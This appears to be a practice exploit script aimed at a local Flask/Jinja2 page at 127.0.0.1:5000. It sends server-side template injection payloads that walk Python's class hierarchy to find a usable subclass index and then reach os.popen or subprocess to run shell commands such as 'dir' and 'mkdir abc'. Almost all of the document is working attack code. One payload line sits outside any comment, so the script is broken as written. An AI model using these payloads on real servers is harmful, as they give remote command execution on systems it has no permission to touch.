import requests
from bs4 import BeautifulSoup
import subprocess


# http://127.0.0.1:5000/plektronika{{''.__class__.__mro__[1].__subclasses__()[527]("echo 'hello'", shell=True)}}


http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()[150].__init__.__globals__['sys'].modules['os'].popen('dir').read()}}

url = 'http://127.0.0.1:5000/plektronika{{"foo".__class__.__base__.__subclasses__()[150]}}'


response = requests.get(url)
content = BeautifulSoup(response.text, 'html.parser')
hack = content.find('h3').text.strip('[]').split('[', maxsplit=1)[1].split(',')

print(hack)

class_to_scrap = 'warnings.WarningMessage'

for index, tag in enumerate(hack):
    if class_to_scrap in tag:
        print(tag, index)

# print("foo".__class__.__base__.__subclasses__()[150].__init__.__globals__['sys'].modules['os'].popen('mkdir abc').read())

